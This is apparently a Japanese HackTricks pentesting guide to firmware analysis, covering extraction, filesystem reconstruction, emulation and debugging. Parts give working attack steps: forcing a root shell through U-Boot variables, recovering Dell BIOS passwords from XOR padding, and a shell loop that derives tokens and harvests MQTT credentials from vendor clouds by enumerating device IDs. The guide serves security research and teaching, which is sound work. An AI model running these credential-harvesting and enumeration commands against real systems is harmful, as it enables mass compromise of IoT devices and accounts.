# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・仲介することで、デバイスを正しく動作させるために不可欠なソフトウェアです。永続メモリに保存されるため、デバイスは電源投入時から重要な命令にアクセスでき、それによってオペレーティングシステムが起動します。セキュリティ上の脆弱性を特定するうえで、ファームウェアの調査や、場合によっては改変が重要な手順となります。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されているテクノロジーを理解するための重要な初期手順です。このプロセスでは、次のデータを収集します。

- CPUアーキテクチャと、その上で動作するオペレーティングシステム
- ブートローダーの詳細
- ハードウェアの構成とデータシート
- コードベースの規模とソースの所在
- 外部ライブラリとライセンスの種類
- アップデート履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**オープンソースインテリジェンス（OSINT）**ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動でレビュー・分析することも有効です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのツールは、潜在的な問題の発見に活用できる無料の静的解析を提供しています。

## **ファームウェアの取得**

ファームウェアの取得にはさまざまな方法があり、それぞれ難易度が異なります。

- ソース（開発者、メーカー）から**直接取得**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされたファームウェアファイルを見つけるために**Google dork**クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのツールを使って、**クラウドストレージ**に直接アクセスする
- man-in-the-middle手法で**アップデート**を傍受する
- **UART**、**JTAG**、**PICit**などの接続を通じてデバイスから**抽出**する
- デバイス通信を監視し、アップデート要求を**スニッフィング**する
- **ハードコードされたアップデートエンドポイント**を特定して利用する
- ブートローダーまたはネットワークから**ダンプ**する
- ほかの方法が使えない場合は、適切なハードウェアツールを使用してストレージチップを**取り外して読み取る**

### UARTログのみの場合: フラッシュ内のU-Boot環境変数を使ってroot shellを強制する

UART RXが無視される場合（ログのみの場合）でも、オフラインで**U-Boot環境変数のデータブロブを編集**すれば、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPIフラッシュをダンプします。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を含め、**blobのU-Boot env CRC32を再計算**します。
3. env partitionのみを書き換えて再起動すると、UART上にshellが表示されます。

これは、bootloader shellは無効になっているものの、外部flashアクセス経由でenv partitionに書き込める組み込みデバイスで役立ちます。

## firmwareの解析

**firmwareを入手したら**、どのように扱うか把握するため、情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` を使ってイメージの **entropy** を確認してください。entropy が低ければ、暗号化されていない可能性が高いです。entropy が高ければ、暗号化されている可能性が高いです（何らかの方法で圧縮されている場合もあります）。

さらに、次のツールを使って **firmware 内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、ファイルを調べるには [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を利用できます。

### 差分フラッシュ解析と復元可能な XOR 秘密ストア

firmware の設定に文書化されたストレージ形式がない場合は、まず同じ条件でフラッシュを複数回読み取り、**設定を1つだけ**変更してから、チップ全体を再度 dump し、オフセットを比較します。値を制御して実験を繰り返すことで、その設定とカウンターや書き込みメタデータを区別できます。データが上書きではなく新しいオフセットに記録される場合は、追記専用またはログ構造型のストアであることを示しています。削除済みまたは tombstone 化されたエントリーも保持してください。ペイロードのバイト列が復元可能な場合があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk` などのツールでファームウェアモジュールを抽出し、Ghidraでwriter/validatorをリバースエンジニアリングします。暗号文のパターンだけから方式を推測するのではなく、コードでフィールド境界、パディング、key indexing、key derivationを確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロパディングからキーを復元する

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)で説明したように、既知平文から同じオフセットのkeystreamバイトが明らかになります。固定サイズのフィールドでは、ゼロパディングが繰り返しXORキーのすべてのインデックスを覆う場合、特に情報が漏れやすくなります。`0x00 XOR key_byte = key_byte`であるため、暗号化されたパディングからキーのバイトを直接読み取れるからです。キーのすべてのインデックスが覆われていれば、暗号文の末尾からキーを復元し、データが格納された部分を復号できます。<sup>[[12]](#references)</sup>

Dellの脆弱なDVAR BIOS-password形式は具体例です。32バイトのフィールドのうち、バイト`0`は平文で、バイト`1..31`には繰り返し使われる20バイトのキーが適用されます。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワード長が `L` の場合、XOR 前は位置 `L..31` がゼロでした。`L <= 12` なら、これらの位置がすべてのキーインデックスをカバーするため、brute force を使わずにキーとパスワード全体を復元できます:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 過去のレコードから鍵を取り出す

各レコードを個別に分析してはいけません。DVARキーはおおよそ `modified_md5(device_seed || variable_GUID || password[0])` として導出されます。device seedとGUIDは固定されており、パスワードに依存する入力は平文の先頭1バイトのみです。そのため、デバイスごとの鍵は最大256個で、同じバイトで始まるレコードは同じ鍵を共有します。アクティブなレコードと削除済みレコードをそのバイトごとにグループ化してください。短い過去のレコードは、パディングを通じてfull keyをleakし、それ自体のパディングだけでは不十分な現在の長いレコードを復号できる場合があります。そのため、古い暗号文を消去せずtombstoneにすると、パスワードローテーションによって露出が増える可能性があります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn)ツールはDVARを特定し、候補レコードを検証し、パスワードを復元して、保存されたデータや鍵の生バイト列を表示できます。checkoutからビルドし、検証済みのflash imageを次のようにスキャンします。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングのチェック、鍵のエントロピー、鍵が折り返す箇所での整合性を使って誤検出を排除します。複数回のダンプで書き込みごとのビット反転がまばらに観測された場合は、観測されたマスクを列挙し、これらの制約に基づいて修正候補を順位付けします。ただし、ヒューリスティックによる出力を正確な復元結果として示すのではなく、曖昧な文字はそのまま報告してください。<sup>[[12]](#references)</sup>

パスワード検証子には、元に戻せる暗号文ではなく、ソルトを加えて反復処理した一方向ハッシュを保存する必要があります。また、ログ構造型ストアでは、置き換えられた機密データを安全に削除する必要があります。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

前述のコメントアウトされたツール（`binwalk -ev <bin>` など）を使えば、**ファイルシステムを抽出**できているはずです。\
通常、Binwalk はファイルシステムの種類を名前とする**フォルダー**内に抽出します。一般的な種類は、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs です。

#### ファイルシステムの手動抽出

Binwalk のシグネチャにファイルシステムのマジックバイトが含まれていない場合があります。その場合は、Binwalk でファイルシステムのオフセットを特定し、バイナリから圧縮されたファイルシステムを切り出して、以下の手順に従い、種類に応じて手動でファイルシステムを抽出してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

次の **dd command** を実行して、Squashfs ファイルシステムをカービングします。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

実行後、ファイルは"`squashfs-root`"ディレクトリ内にあります。

- CPIOアーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND flashを使用するubifsファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込みroot filesystemの再構築

raw eMMC/SSDダンプに有効なファイルシステムヘッダーが含まれているものの、メタデータのオフセットがパーティションの公称範囲を超えている場合、すぐに破損していると判断しないでください。組み込みの起動コードはDevice Mapperを使って複数の物理範囲から実際のroot deviceを構成することがあるため、GPTパーティションを1つだけ切り出しても、最初のセグメントしか得られない場合があります。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得が完了していること、サイズが安定していること、イメージをまだ書き込み中のプロセスがないことを確認します。ファイル名に開始アドレスと終了アドレスが含まれている場合は、その範囲を実際のバイト数と照合します。GPTを読み取り専用モードで復元し、必要な範囲だけをアタッチしてください。ワークステーション上で、信頼できない物理ボリュームに対して`vgchange -ay`を実行してはいけません。ボリュームグループの衝突や意図しない書き込みが発生する可能性があります。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init ロジックまたは LVM スタックがイメージ全体を参照する必要がある場合は、使い捨て VM を使用してください。標準ブートパーティションの過去のブートログは特に有用です。ブートローダーが、独自コンテナ内のオフセット、コンポーネントの長さ、スロット選択、アラインメント規則、署名検証を記録している場合があります。その値を使って、埋め込みのコマンドライン、カーネル、initramfs を切り出し、各出力を `file`、マジックバイト、`binwalk` で個別に検証します。コンテナの末尾まで読み込むと、initrd、ACPI オブジェクト、または署名が誤ってカーネルに追加されることがあります。<sup>[[9]](#references)</sup>

#### ブート時のブロックマップを復元する

カーネルの initramfs を展開し、その `/init` とストレージライブラリをリバースエンジニアリングします。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、パーティションパスへの文字列参照をたどり、アクティブな A/B スロットを選択してテーブルを構築するコードを追跡します。radare2 の開始点として、`r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` が役立ちます。<sup>[[9]](#references)</sup>

linear ターゲットは、仮想デバイスの連続した範囲を、1 つ以上のバックアップデバイスの範囲にマッピングします。復元された 2 セグメントのテーブルは、一般に次の形式です（位置と長さはすべて 512 バイトセクター単位です）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

機械語の算術処理を、整数幅、シフト、単位変換も含めて正確に再現してください。たとえば、次の式はバイト単位のサイズをまず4-KiB境界に切り下げてから、512-byteセクター単位に変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

テーブル順に範囲をコピーし、上限付きのチャンクを使ってフラットな解析イメージを再構築します。これにより、メディアダンプ全体をメモリに読み込まずに済み、ホスト側の mapper デバイスの作成も回避できます。GPT から導出したオフセット、反転したセクター数、生成される出力長は、それぞれ別個にアサーションで検証してください。<sup>[[9]](#references)</sup>

#### 破損と一定の再構築エラーを区別する

SquashFS では、`unsquashfs` を実行する前に、`hsqs` マジックを確認し、スーパーブロックのオフセット 40 にあるリトルエンディアンの 64 ビット `bytes_used` フィールドをデコードしてください。複数の無関係な構造で展開に失敗する場合は、想定される位置の周辺の広い範囲を検索し、強い構造的候補を必須条件としてください。たとえば、展開可能なメタデータブロック、連続する複数の有効なディレクトリエントリ、妥当な inode フィールド、inode 数と整合するルート inode、または有効な整合性メタデータ構造です。マジックが 1 つ見つかっただけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ符号付き差分によって独立した構造（たとえばディレクトリメタデータとverityレコード）が有効になる場合、原因として考えられるのは、バイトの欠落ではなく、セグメント開始位置の系統的な誤りです。孤立データの復旧やファイルシステムメタデータのパッチを試みる前に、逆算に戻り、切り捨てられた余り、符号の扱い、オーバーフロー、セクター／ページ単位の丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護の境界は分けて考えてください。TPMに鍵を封印したLUKSボリュームはデータの機密性を保護し、署名付きdm-verityマッピングはルートファイルシステムの完全性を保護します。ソフトウェアTPMでは、元の物理TPMに封印された鍵を復元できません。また、verity検証を省略する研究専用initで改変されたSquashFSを起動しても、その署名が偽造されるわけでも、dm-verityが破られるわけでもありません。<sup>[[9]](#references)</sup>

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために解析することが重要です。この作業では、さまざまなツールを使ってファームウェアイメージを分析し、有用なデータを抽出します。

### 初期分析ツール

バイナリファイル（`<bin>`と表記）の初期調査に使うコマンドを以下に示します。これらのコマンドは、ファイル形式の特定、文字列の抽出、バイナリデータの分析、パーティションとファイルシステムの詳細の把握に役立ちます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` で**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools**のドキュメントや、ファイル検査用の**binvis.io**などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>`を使うと、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類にちなんだ名前のディレクトリ（例: squashfs、ubifs）に出力されます。ただし、マジックバイトが不足しているために**binwalk**がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。`binwalk`でファイルシステムのオフセットを特定し、続いて`dd`コマンドでファイルシステムを切り出します:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### ファイルシステム解析

ファイルシステムを抽出したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、更新サーバー機能、未コンパイルのコード、起動スクリプト、オフライン解析用のコンパイル済みバイナリに注目します。

確認すべき**主な場所**と**項目**は次のとおりです。

- ユーザー認証情報が保存された **etc/shadow** と **etc/passwd**
- **etc/ssl** 内のSSL証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる解析が必要な組み込みバイナリ
- IoTデバイスで一般的に使われるWebサーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見には、次のようなツールが役立ちます。

- 機密情報の検索には [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア解析には [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的解析と動的解析には [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、および [**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unixバイナリ向けの **checksec.sh** やWindowsバイナリ向けの **PESecurity** などのツールを使うと、悪用される可能性のある保護されていないバイナリを特定できます。

## 派生URLトークンを介したクラウド設定とMQTT認証情報の取得

多くのIoTハブは、次のようなクラウドエンドポイントからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア解析中に、たとえば次のように、`<token>` がハードコードされた秘密鍵を使ってデバイスIDからローカルで生成されていることがわかる場合があります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceIdとSTATIC_KEYを知った人なら誰でもURLを再構築してクラウド設定を取得できます。多くの場合、平文のMQTT認証情報やトピックのプレフィックスが漏洩します。

実践的な手順:

1) UARTの起動ログからdeviceIdを抽出する

- 3.3VのUARTアダプター（TX/RX/GND）を接続し、ログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URLパターンとbrokerアドレスを出力する行を探します。たとえば:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware から STATIC_KEY と token の algorithm を特定する

- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 の使用箇所を検索する。
- algorithm（例: MD5(deviceId||STATIC_KEY)）を確認する。
- Bash で token を導出し、digest を大文字にする:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) クラウド設定と MQTT 認証情報を収集

- URL を組み立てて curl で JSON を取得し、jq で解析してシークレットを抽出します。

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACL を悪用する（存在する場合）

- 復元した認証情報を使ってメンテナンストピックを subscribe し、機密性の高いイベントを探します。

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイス ID を列挙する（許可を得たうえで、大規模に）

- 多くのエコシステムでは、ベンダーの OUI／製品／タイプを示すバイト列の後に、連番のサフィックスが続く形式になっています。
- 候補 ID を順に試し、トークンを導出して、プログラムから設定を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大量列挙を試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、ターゲットのハードウェアを変更せずに秘密情報を復元するため、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレートすることで、デバイスの動作または個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題になることがありますが、root filesystemまたは特定のバイナリを、Raspberry Piなどのアーキテクチャとエンディアンが一致するデバイス、あるいは事前構築済みの仮想マシンに移すことで、さらなるテストを実施できます。

### 個々のバイナリのエミュレーション

単一のプログラムを調べるには、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用します。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARM バイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレータを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションが可能です。プロセスが自動化され、動的解析にも役立ちます。

### エミュレーション用に分割された検証済み root filesystem を再構築する

SquashFS の superblock は読み取れるものの、inode、directory、fragment table のオフセットが不正な場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースし、そこから生成される block-device graph を再現します。組み込みシステムでは、見かけ上の root partition が存在していても、別の partition から借用した sector を追加する `dm-linear` mapping によって、実際の filesystem が構成されている場合があります。superblock のみを検査すると正常に見えても、それ以降のすべての metadata block がずれている可能性があります。<sup>[[11]](#references)</sup>

ファームウェアの算術処理は正確に再現してください。特に、長さの単位が byte、512-byte sector、4 KiB page のどれなのかを特定し、shift と切り捨てを元の順序で再現し、A/B layout における bank 依存の末尾領域も考慮します。たとえば `(partition_bytes >> 12) << 3` は、まず 4 KiB 境界で切り捨ててから、結果を 512-byte sector 単位で表します。これを `partition_bytes // 512` に置き換えると、追加される extent の位置が数 kilobyte ずれ、以降のすべての SquashFS table が破損する可能性があります。<sup>[[11]](#references)</sup>

有効な検証手順は次のとおりです。<sup>[[11]](#references)</sup>

1. verifier/init バイナリから、各 `dm-linear` segment の source device、start sector、length を特定します。
2. alignment の扱いを変えずに、各 extent を連結または map します。
3. それでも展開に失敗する場合は、予測した境界の周辺の狭い範囲だけを検索し、もっともらしい superblock だけで判断せず、連続する複数の有効な metadata structure を確認します。
4. 再構築したイメージに変更していない `unsquashfs` を実行します。`unsquashfs -stat` よりも、すべての directory と fragment を正常に走査できることのほうが強い証拠になります。

#### Analyst-controlled dm-verity replacement

解析者が QEMU kernel、initramfs、virtual disk を制御できる場合は、ベンダーの検証用 PID 1 を小さな静的リンク済み init に置き換えることで、変更した root を起動できます。これは **lab boot-chain substitution** であり、dm-verity、RSA signature、Secure Boot、TPM に封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換える init は、元のブートパスの実動作部分を模倣する必要があります。`devtmpfs` を mount し、`setsid()` を呼び出し、`/dev/console` を file descriptor 0–2 に接続し、`/proc` と `/sys` を mount し、指定された block device を待ち、編集した root を read-only で mount し、古い root の pseudo-filesystem を detach して、新しい mount を `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` します。`MS_MOVE` **の前に** `/dev`、`/proc`、`/sys` を detach すると、新しい root に属する mount point を誤って detach するのを防げます。<sup>[[11]](#references)</sup>

変更した immutable root とは別に、変更可能な device state を保持します。qcow2 overlay を使って元の disk の LVM state を保持し、2 台目の read-only virtio disk で編集した SquashFS を提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインでのイメージ状態のデバッグ

起動が遅い、破壊的な起動スクリプトがある、またはコンソールログが不安定で障害の原因が分かりにくい場合は、guest の外部から永続状態を調べます。実行中の VM が使用している overlay は絶対に接続しないでください。`qemu-nbd` で公開し、LVM の検出対象を目的の NBD パーティションに限定してから、切断する前にボリュームグループを非アクティブ化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現可能な fault isolation のため、安定した書き込み可能なボリュームにタイムスタンプ付きの marker file を書き込み、オフラインで検証してください。`/dev/kmsg`、FIFO、一時的なコンソールでは、rate limiting やプロセスの早期終了によって false negative が発生することがあります。また、無関係なコードを変更する前に、各レイヤーでインターフェースが正確に一致するか比較してください。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` 世代と DRI driver ABI、PCI から特定される driver 名を比較します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使用できない場合があります。<sup>[[11]](#references)</sup>

## 実践的な動的解析

この段階では、実機またはエミュレートされたデバイス環境を解析に使用します。OS とファイルシステムへの shell access を維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全に再現できない場合があり、エミュレーションを再起動する必要が生じることもあります。解析では、ファイルシステムを再確認し、公開されている Web ページやネットワークサービスを exploit し、bootloader の脆弱性を調査してください。潜在的な backdoor の脆弱性を特定するには、firmware integrity テストが重要です。

## ランタイム解析手法

ランタイム解析では、gdb-multiarch、Frida、Ghidra などのツールを使用し、ブレークポイントの設定や fuzzing などの手法を通じて脆弱性を特定しながら、実行環境内のプロセスやバイナリを調査します。

完全な debugger がない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピーして、リモートからアタッチしてください**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT ハブでは、RF stack が **radio MCU** と Linux userland process に分割されていることがよくあります。有用なワークフローは、次の経路をマッピングすることです:<sup>[[8]](#references)</sup>

1. 空中の **RF frame**
2. radio MCU 上の **controller-side parser**
3. Linux に転送される **serial/UART text または TLV protocol**（例: `/dev/tty*`）
4. メイン daemon 内の **application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、解析対象が1つではなく2つになります。controller が binary radio frame を `Group,Command,arg1,arg2,...` のようなテキスト protocol に変換する場合は、次の項目を特定します。

- **message group** と dispatch table
- どのメッセージが **network** から来るのか、controller 自体から来るのか
- 正確な **manufacturer-specific discriminator field**（例: Zigbee の `manufacturer_code` と custom `cluster_command`）
- **commissioning**、discovery、firmware/model download の各段階でのみ到達可能な handler

特に Zigbee では、pairing traffic をキャプチャし、対象がデフォルトの **Link Key** `ZigBeeAlliance09` に依然として依存しているか確認します。依存している場合、commissioning traffic の sniffing によって **Network Key** が露出する可能性があります。Zigbee 3.0 の install code はこのリスクを軽減するため、テスト対象のデバイスが実際に install code を強制しているか記録します。

### Manufacturer-specific protocol handler と FSM によって制限される到達可能性

Vendor-specific Zigbee/ZCL command は、標準化された cluster よりも有力なターゲットであることがよくあります。**custom parsing code** と、十分に検証されていない内部 **FSM** に渡されるためです。<sup>[[8]](#references)</sup>

実践的なワークフロー:

- command dispatcher を解析し、**vendor-only handler** を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state** の table を特定する。
- 自動的に遷移する **transitional state** と、最終的に attacker-controlled state を reset または free する retry/error branch を特定する。
- バグのある handler に常に到達可能だと決めつけず、daemon を脆弱な state に移行させるために必要な正規の protocol exchange を確認する。

タイミングに敏感な protocol では、Python framework からの packet replay は遅すぎることがあります。より確実な方法は、vendor-grade stack を使って実機（例: **nRF52840**）上で正規デバイスをエミュレートし、適切な **endpoint**、**attribute**、commissioning timing を再現することです。

### Embedded daemon における fragmented-download のバグクラス

**fragmented blob/model/configuration download** では、次のような firmware bug が繰り返し見られます。<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）で `ctx->total_size` を保存し、`malloc(total_size)` を呼び出す。
2. 後続の fragment では、`packet_total_size >= offset + chunk_len` など、攻撃者が制御する **packet-local** field しか検証しない。
3. **元の割り当てサイズ**と照合せず、`memcpy(&ctx->buffer[offset], chunk, chunk_len)` でコピーする。

これにより、攻撃者は次の操作ができます。

- 小さい heap allocation を強制するため、宣言サイズが **小さい**最初の正規 fragment を送信する。
- **想定される offset** を維持しつつ、より大きな `chunk_len` を持つ後続 fragment を送信する。
- packet-local size を偽装し、最初に割り当てられた buffer を overflow させながら、新たな検証を通過させる。

